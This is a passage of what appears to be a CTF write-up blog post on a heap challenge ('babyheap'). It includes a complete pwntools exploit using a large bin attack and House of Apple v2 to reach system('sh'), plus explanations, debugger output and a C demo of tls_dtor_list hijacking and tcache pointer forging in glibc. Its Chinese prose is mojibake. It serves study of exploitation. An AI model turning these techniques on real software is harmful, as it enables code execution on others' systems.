<span class="keyword">return</span> p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">name</span>): <span class="keyword">return</span> log.success(</span><br><span class="line">    <span class="string">&#x27;\033[32m%s ==&gt; 0x%x\033[0m&#x27;</span> % (name, <span class="built_in">eval</span>(name)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uu64</span>(): <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itob</span>(<span class="params">num</span>): <span class="keyword">return</span> <span class="built_in">str</span>(num).encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">p</span>):</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;babyheap&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = elf.process()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">cmd</span>):</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&quot;</span>, itob(cmd))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz, con</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input your name size&quot;</span>, itob(sz))</span><br><span class="line">    sa(<span class="string">b&quot;input your name&quot;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, sz, con</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input index&quot;</span>, itob(idx))</span><br><span class="line">    sla(<span class="string">b&quot;input your name size&quot;</span>, itob(sz))</span><br><span class="line">    sa(<span class="string">b&quot;input your name&quot;</span>, con)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input index&quot;</span>, itob(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input index&quot;</span>, itob(idx))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">heap_base = heap_addr - <span class="number">0x2a0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x428</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&#x27;a\n&#x27;</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x448</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line">payload = fit(&#123;</span><br><span class="line">    <span class="number">0x0</span>: heap_base+<span class="number">0x2b0</span>+<span class="number">0x500</span>,</span><br><span class="line">    <span class="number">0x8</span>: heap_base+<span class="number">0x2b0</span>+<span class="number">0x500</span>,</span><br><span class="line">    <span class="number">0x410</span>: <span class="number">0x420</span></span><br><span class="line">&#125;, filler = <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0x418</span>, payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">leak = uu64()</span><br><span class="line">libc.address = leak - <span class="number">0x1d3ce0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = fit(&#123;</span><br><span class="line">    <span class="number">0x0</span>: heap_base+<span class="number">0xff0</span>+<span class="number">0x500</span>,</span><br><span class="line">    <span class="number">0x8</span>: heap_base+<span class="number">0xff0</span>+<span class="number">0x500</span>,</span><br><span class="line">    <span class="number">0x420</span>: <span class="number">0x430</span></span><br><span class="line">&#125;, filler = <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="number">0x428</span>, payload)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x428</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ## large bin attack =&gt; IO_list_all -&gt; chunk0</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">payload = fit(&#123;</span><br><span class="line">    <span class="number">0x18</span>: libc.sym._IO_list_all - <span class="number">0x20</span>,</span><br><span class="line">&#125;, filler = <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="built_in">len</span>(payload) + <span class="number">1</span>, payload + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # house of apple v2</span></span><br><span class="line">fs = FileStructure()</span><br><span class="line">fs.vtable = libc.sym._IO_wfile_jumps</span><br><span class="line"><span class="comment"># write_base &lt; write_ptr</span></span><br><span class="line">fs._IO_write_base = <span class="number">0</span></span><br><span class="line">fs._IO_write_ptr = <span class="number">1</span></span><br><span class="line">fs.chain = <span class="number">0</span></span><br><span class="line"><span class="comment"># fs._lock = libc.sym._IO_stdfile_2_lock</span></span><br><span class="line"><span class="comment"># lock æ£€æŸ¥</span></span><br><span class="line">fs._lock = libc.address + <span class="number">0x1d5a20</span></span><br><span class="line"><span class="comment"># # codecvt = ?</span></span><br><span class="line"><span class="comment"># fs._codecvt = ?</span></span><br><span class="line">fs._wide_data = heap_base + <span class="number">0xff0</span> + <span class="number">0x500</span></span><br><span class="line">payload = <span class="built_in">bytes</span>(fs)[<span class="number">0x10</span>:]</span><br><span class="line">edit(<span class="number">1</span>, <span class="built_in">len</span>(payload) + <span class="number">1</span>, payload + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">wdata = fit(&#123;</span><br><span class="line">    <span class="number">0xe0</span>-<span class="number">0x10</span>: heap_base+<span class="number">0xff0</span>+<span class="number">0xe0</span>+<span class="number">0x10</span>+<span class="number">0x500</span>,</span><br><span class="line">    <span class="number">0xe0</span>: &#123;</span><br><span class="line">        <span class="number">0x68</span>: libc.sym.system</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="built_in">len</span>(wdata) + <span class="number">1</span>, wdata + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;heap_addr&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;heap_base&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;libc.address&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x4f0</span> + <span class="string">b&quot;     sh;&quot;</span>  <span class="comment"># flag rdi</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><p>ä¸»è¦åˆ©ç”¨large bin leakï¼Œä½†æ˜¯å› ä¸ºå…¶å¯ä»¥ä½¿ç”¨tcache binï¼Œçœ‹åˆ°äº†å…¶ä»–çš„åˆ©ç”¨æ‰‹æ®µ</p><ul><li>æœ€ç»ˆtcacheä¿®æ”¹TLSï¼Œé€šè¿‡__call_tls_dtorså‡½æ•°å®ç°system(â€œ&#x2F;bin&#x2F;shâ€)</li><li>IO leak æ ˆåœ°å€ï¼Œç„¶åè·³è½¬åˆ°æ ˆä¸Šè¿›è¡ŒæŒ‡å‘å‡½æ•°ã€‚</li></ul><h3 id="tls-dtor"><a href="#tls-dtor" class="headerlink" title="tls_dtor"></a>tls_dtor</h3><p>ä¸€ç§æ¯”è¾ƒç®€å•çš„åˆ©ç”¨æ‰‹æ®µï¼Œæ­£å¸¸æƒ…å†µä¸‹å­˜åœ¨å¦‚ä¸‹çš„è°ƒç”¨é“¾</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br><span class="line">__run_exit_handlers</span><br><span class="line">__call_tls_dtors</span><br></pre></td></tr></table></figure><p>å…¶å‡½æ•°å®ç°å¦‚ä¸‹</p><ul><li>ä¸€ä¸ªå…¨å±€å˜é‡æ˜¯å¦å­˜åœ¨</li><li>æ‰¾åˆ°å…¶å‡½æ•°æŒ‡é’ˆ</li><li><code>PTR_DEMANGLE</code> è®¡ç®—å‡½æ•°åœ°å€</li><li>è°ƒç”¨å‡½æ•°</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__call_tls_dtors (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (tls_dtor_list)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">dtor_list</span> *cur = tls_dtor_list;</span><br><span class="line">      dtor_func func = cur-&gt;func;</span><br><span class="line">      <span class="built_in">PTR_DEMANGLE</span> (func);</span><br><span class="line"></span><br><span class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">      <span class="built_in">func</span> (cur-&gt;obj);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Ensure that the MAP dereference happens before</span></span><br><span class="line"><span class="comment"> l_tls_dtor_count decrement.  That way, we protect this access from a</span></span><br><span class="line"><span class="comment"> potential DSO unload in _dl_close_worker, which happens when</span></span><br><span class="line"><span class="comment"> l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */</span></span><br><span class="line">      <span class="built_in">atomic_fetch_add_release</span> (&amp;cur-&gt;map-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">      <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span> (__call_tls_dtors)</span><br></pre></td></tr></table></figure><p>å…¶ç»“æ„ä½“å¦‚ä¸‹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*dtor_func)</span> <span class="params">(<span class="type">void</span> *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// destructor list</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">dtor_list</span></span><br><span class="line">&#123;</span><br><span class="line">  dtor_func func;</span><br><span class="line">  <span class="type">void</span> *obj;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">link_map</span> *map;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">dtor_list</span> *next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>PTR_DEMANGLE è¿™ä¸ªå®è®¡ç®—å‡½æ•°åœ°å€</p><ul><li>å¾ªç¯å³ç§»0x11ä½</li><li>ä¸ pointer_guard è¿›è¡Œå¼‚æˆ–</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> PTR_DEMANGLE(reg)ror $2*LP_SIZE+1, reg;      \</span></span><br><span class="line"><span class="meta">xor %fs:POINTER_GUARD, reg</span></span><br></pre></td></tr></table></figure><p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œè¿™ä¸ªå€¼ä¸º0ï¼Œä¸ä¼šè°ƒç”¨å¦‚ä¸‹çš„å‡½æ•°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p tls_dtor_list</span><br><span class="line"><span class="variable">$1</span> = (struct dtor_list *) 0x0</span><br></pre></td></tr></table></figure><p>å› ä¸ºè¿™é‡Œæ²¡æœ‰ä»€ä¹ˆæ£€æŸ¥ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ”»å‡»è¿™ä¸ªå€¼ï¼Œè®©å…¶æŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„ä¸€ä¸ª <code>dtor_list</code> ç»“æ„ä½“ã€‚</p><ul><li>func é¦–å…ˆè·å¾—åœ°å€ï¼Œå…ˆäº pointer_guard è¿›è¡Œå¼‚æˆ–ï¼Œç„¶ååœ¨è¿›è¡Œå¾ªç¯å·¦ç§»11ä½</li><li>obj ä½œä¸ºå‡½æ•°å‚æ•°æŒ‡é’ˆã€‚</li></ul><p>åœ¨æ±‡ç¼–ä¸­</p><ul><li>tls_dtor_list ä¹Ÿåœ¨ fs é™„è¿‘</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> tls_dtor_list=1   <span class="comment"># è¿›å…¥å¾ªç¯ï¼Œå¯»æ‰¾åç§»</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; p <span class="variable">$rbp</span></span><br><span class="line"><span class="variable">$4</span> = (void *) 0xffffffffffffffb0</span><br><span class="line">pwndbg&gt; p (long)<span class="variable">$rbp</span></span><br><span class="line"><span class="variable">$5</span> = -80</span><br><span class="line"></span><br><span class="line">0x7ffff7e02606 &lt;__call_tls_dtors+6&gt;     mov    rbp, qword ptr [rip + 0x194773]</span><br><span class="line">0x7ffff7e0260d &lt;__call_tls_dtors+13&gt;    mov    rbx, qword ptr fs:[rbp]</span><br><span class="line">0x7ffff7e02612 &lt;__call_tls_dtors+18&gt;    <span class="built_in">test</span>   rbx, rbx                        <span class="comment"># è¿™é‡Œå°±æ˜¯tls_dtor_list å€¼</span></span><br><span class="line">0x7ffff7e02615 &lt;__call_tls_dtors+21&gt;    je     __call_tls_dtors+94                &lt;__call_tls_dtors+94&gt;</span><br><span class="line">0x7ffff7e02617 &lt;__call_tls_dtors+23&gt;    nop    word ptr [rax + rax]</span><br><span class="line">â–º 0x7ffff7e02620 &lt;__call_tls_dtors+32&gt;    mov    rdx, qword ptr [rbx + 0x18]   <span class="comment"># next æŒ‡é’ˆ</span></span><br><span class="line">0x7ffff7e02624 &lt;__call_tls_dtors+36&gt;    mov    rax, qword ptr [rbx]            <span class="comment"># func</span></span><br><span class="line">0x7ffff7e02627 &lt;__call_tls_dtors+39&gt;    ror    rax, 0x11                       <span class="comment"># å¾ªç¯å³ç§»</span></span><br><span class="line">0x7ffff7e0262b &lt;__call_tls_dtors+43&gt;    xor    rax, qword ptr fs:[0x30]        <span class="comment"># pointer_guard </span></span><br><span class="line">0x7ffff7e02634 &lt;__call_tls_dtors+52&gt;    mov    qword ptr fs:[rbp], rdx</span><br><span class="line">0x7ffff7e02639 &lt;__call_tls_dtors+57&gt;    mov    rdi, qword ptr [rbx + 8]</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/xg <span class="variable">$fs_base</span>+0x30</span><br><span class="line">0x7ffff7dc1770: 0x851e64b26accf332</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦å°†ä¼ªé€ çš„ç»“æ„ä½“ä¸­å‡½æ•°åœ°å€è¿›è¡Œä¸€ä¸ªç§»ä½è¿ç®—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rol</span>(<span class="params">addr</span>):</span><br><span class="line"><span class="keyword">return</span> ((addr &lt;&lt; <span class="number">0x11</span>) &amp; <span class="number">0xffffffffffffffff</span>) | (addr &gt;&gt; <span class="number">0x2f</span>)</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªå°demoï¼Œæ¥è‡ª <a href="https://zhuanlan.zhihu.com/p/654914149">glibc2.35-é€šè¿‡tls_dtor_liståŠ«æŒexitæ‰§è¡Œæµç¨‹</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title">rotate_left</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> value, <span class="type">int</span> left)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (value &lt;&lt; left) | (value &gt;&gt; (<span class="built_in">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) * <span class="number">8</span> - left));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fs_base;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> index = <span class="number">0xffffffffffffffa8</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> tls_dtor_list_addr;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> random_number;</span><br><span class="line">  <span class="type">void</span> *system_ptr = (<span class="type">void</span> *)&amp;system;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;system:%p\n&quot;</span>, system_ptr);</span><br><span class="line">  <span class="built_in">asm</span>(<span class="string">&quot;mov %%fs:0, %0&quot;</span> : <span class="string">&quot;=r&quot;</span>(fs_base));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Value in FS register: 0x%llx\n&quot;</span>, fs_base);</span><br><span class="line">  tls_dtor_list_addr = fs_base - <span class="number">80</span>;</span><br><span class="line">  random_number = *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)(fs_base + <span class="number">0x30</span>);</span><br><span class="line">  <span class="type">char</span> *str_bin_sh = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(str_bin_sh, <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="type">void</span> *ptr = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)ptr =</span><br><span class="line">      <span class="built_in">rotate_left</span>((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)system_ptr ^ random_number, <span class="number">0x11</span>);</span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)(ptr + <span class="number">8</span>) = str_bin_sh;</span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)tls_dtor_list_addr = ptr;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨é«˜ç‰ˆæœ¬ çš„ tcache bin attack é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨è¿™ä¸ªã€‚</p><ul><li>tcache fd åŠ å¯†é—®é¢˜ã€‚</li></ul><p>å¦‚ä¸‹ä¸º chunk æ”¾å…¥ tcache bin ç›¸å…³çš„å‡½æ•°ã€‚</p><ul><li>å› ä¸º header çš„å­˜åœ¨ï¼Œç¬¬ä¸€æ­¥å°† chunk è½¬åŒ–æˆ tcache_entry</li><li>key ä¸ºä¸€ä¸ªéšæœºæ•°</li><li>nextæŒ‡é’ˆè®¡ç®—ï¼ŒnextæŒ‡é’ˆçš„åœ°å€å³ç§»12ä½ï¼Œç„¶åä¸ <code>prev tcache bin</code> æŒ‡é’ˆè¿›è¡Œ <code>xor</code> è¿ç®—ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> chunk2mem(p) ((void*)((char*)(p) + CHUNK_HDR_SZ))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tcache_entry</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">tcache_entry</span> *next;                <span class="comment">// å¸¸è¯´çš„ fd æŒ‡é’ˆ </span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> key;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tcache_perthread_struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> __always_inline <span class="type">void</span> <span class="title">tcache_put</span><span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span> </span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *)<span class="built_in">chunk2mem</span>(chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key;      <span class="comment">// ä¸€ä¸ªéšæœºæ•°ï¼Œtcache_key_initialize (void) ç”Ÿæˆ</span></span><br><span class="line"></span><br><span class="line">  e-&gt;next = <span class="built_in">PROTECT_PTR</span>(&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥åšä¸€ä¸ªæµ‹è¯•ï¼ŒæŸ¥çœ‹tcache çš„nextæŒ‡é’ˆã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20xg 0x555555559290</span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x5555555592a0: 0x0000000555555559      0xa8d3bb0dc1ab0725</span><br><span class="line">0x5555555592b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592e0: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x5555555592f0: 0x000055500000c7f9      0xa8d3bb0dc1ab0725</span><br><span class="line">0x555555559300: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559310: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559320: 0x0000000000000000      0x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p/x (0x5555555592f0 &gt;&gt; 12) ^ 0x5555555592a0</span><br><span class="line"><span class="variable">$1</span> = 0x55500000c7f9</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬ä¼ªé€ fdã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(addr &gt;&gt; <span class="number">12</span>) ^ pos</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="https://kagehutatsu.com/?p=951">2023 é¹åŸæ¯ Pwn éƒ¨åˆ†Writeup</a></li><li><a href="https://blog.xmcve.com/2023/11/05/%E9%B9%8F%E5%9F%8E%E6%9D%AF2023-Writeup/#title-7">é¹åŸæ¯2023 Writeup</a></li><li><a href="https://unauth401.tech/pcb2023/#baby-heap">é¹åŸæ¯ 2023 åˆèµ› Pwn WriteUp</a></li><li><a href="https://mp.weixin.qq.com/s/tjz3urSdsQac30JiqVN62Q">2023ç¬¬ä¸‰å±Šâ€œé¹åŸæ¯â€çº¿ä¸Šåˆèµ›WriteUp</a></li><li><a href="https://www.cnblogs.com/ZIKH26/articles/16066329.html">DASCTF2022_checkin - ZikH26</a></li></ul>]]></content>
      
      
      <categories>
          
